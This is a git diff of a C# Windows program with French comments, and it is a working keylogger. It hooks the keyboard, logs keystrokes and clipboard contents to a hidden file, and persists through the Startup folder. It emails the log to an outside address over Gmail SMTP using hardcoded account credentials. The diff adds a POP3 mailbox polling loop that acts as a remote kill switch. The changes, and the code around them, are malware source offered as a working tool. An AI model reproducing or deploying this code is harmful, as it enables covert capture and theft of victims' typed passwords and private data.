@@ -5,6 +5,10 @@ using System.Net.Mail;
 using System.Net.Mime;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using OpenPop;
+using Limilabs.Mail;
+using Limilabs.Client.POP3;
+using System.Collections.Generic;
 
 namespace Win32AppAF
 {
@@ -19,16 +23,6 @@ namespace Win32AppAF
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
-        private const int WH_KEYBOARD_LL = 13;
-        private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
-        private static IntPtr _hookID = IntPtr.Zero;
-
-        private static string TouchesAppuiee = string.Empty;
-        private static string pressePapier = string.Empty;
-        public static Timer delaiSave = new Timer();
-        public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        public static string cheminFichier = cheminDossier + @"\varTemp.txt";
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -43,7 +37,24 @@ namespace Win32AppAF
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private static string TouchesAppuiee = string.Empty;
+        private static string pressePapier = string.Empty;
+        public static Timer delaiWrite = new Timer();
+        public static Timer checkEmailSuppr = new Timer();
+        public static string cheminDossier = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public static string cheminFichier = cheminDossier + @"\varTemp.txt";
+
+        public const int TAILLEFICHIER = 10000; // Taille du fichier limite, moment ou le fichier est envoyé
+        public static int NbrMilliSecondeIntervale = 10000; // Nombre de milliseconde entre les ticks du timer
 
         [STAThread]
         static void Main(string[] args)
@@ -58,12 +69,20 @@ namespace Win32AppAF
             if (!System.IO.File.Exists(demarrage))
             {
                 File.Move(emplacement, demarrage);
+
+                FileInfo fileInfo = new FileInfo(demarrage);
+                fileInfo.IsReadOnly = false;
             }
 
-            delaiSave.Interval = 30000;
-            delaiSave.Tick += delaiSave_Tick;
 
-            delaiSave.Enabled = true;
+            delaiWrite.Interval = NbrMilliSecondeIntervale;
+            delaiWrite.Tick += delaiWrite_Tick;
+
+            checkEmailSuppr.Interval = 60000;
+            checkEmailSuppr.Tick += checkEmailSuppr_Tick;
+
+            delaiWrite.Enabled = true;
+            checkEmailSuppr.Enabled = true;
 
             Application.EnableVisualStyles();
             _hookID = SetHook(_proc);
@@ -73,20 +92,45 @@ namespace Win32AppAF
             UnhookWindowsHookEx(_hookID);
         }
 
-        static void delaiSave_Tick(object sender, EventArgs e)
+        static void checkEmailSuppr_Tick(object sender, EventArgs e)
+        {
+            Pop3 client = new Pop3();
+            client.Connect("pop.gmail.com", 995, true);
+            client.Login("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
+            foreach (string idMessage in client.GetAll())
+            {
+                Limilabs.Mail.MailBuilder mail = new MailBuilder();
+                IMail mailObj = mail.CreateFromEml(client.GetMessageByUID(idMessage));
+                string contenu = mailObj.GetBodyAsText();
+
+                if (contenu.Contains("DELETE") && (contenu.Contains(Environment.UserName)))
+                {
+                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe");
+                    client.DeleteMessageByUID(idMessage);
+                    client.Close();
+                    Application.Exit();
+                }
+
+            }
+            
+        }
+
+
+        static void delaiWrite_Tick(object sender, EventArgs e)
         {
             using (StreamWriter tw = new StreamWriter(cheminFichier, true))
             {
+                
                 tw.WriteLine(TouchesAppuiee + Environment.NewLine + " --- FIN : " + System.DateTime.Now + " --- " + Environment.NewLine + pressePapier);
                 tw.Close();
-                TouchesAppuiee = string.Empty;
+                TouchesAppuiee = Environment.NewLine + " --- DEBUT --- " + Environment.NewLine;
                 pressePapier = string.Empty;
             }
 
             FileInfo fInfo = new FileInfo(cheminFichier);
             int sizeFile = (int)(fInfo.Length);     
 
-            if (sizeFile >= 100)
+            if (sizeFile >= TAILLEFICHIER)
             {
                 MailMessage mail = new MailMessage("bilaldu93de93@gmail.com", "lucas.dnt@eduge.ch");
                 mail.Subject = "La clé du savoir";
@@ -99,8 +143,7 @@ namespace Win32AppAF
                 disposition.ReadDate = System.IO.File.GetLastAccessTime(cheminFichier);
                 mail.Attachments.Add(data);
 
-                SmtpClient smtp = new SmtpClient("smtp.gmail.com");
-                smtp.Port = 587;
+                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                 smtp.Credentials = new System.Net.NetworkCredential("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
                 smtp.EnableSsl = true;
                 smtp.Send(mail);
@@ -111,6 +154,11 @@ namespace Win32AppAF
             }
         }
 
+        /// <summary>
+        /// Pas la moindre idée de ce que ça fait
+        /// </summary>
+        /// <param name="proc"></param>
+        /// <returns></returns>
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -120,8 +168,16 @@ namespace Win32AppAF
             }
         }
 
-        static bool ctrlAppuye = false;
 
+        static bool ctrlAppuye = false; // variable qui permet de determiner si l'utilisateur fait une combinaison type : Ctrl+C / Ctrl+X
+
+        /// <summary>
+        /// Code qui se déclenche lors de l'appuis sur une touche
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
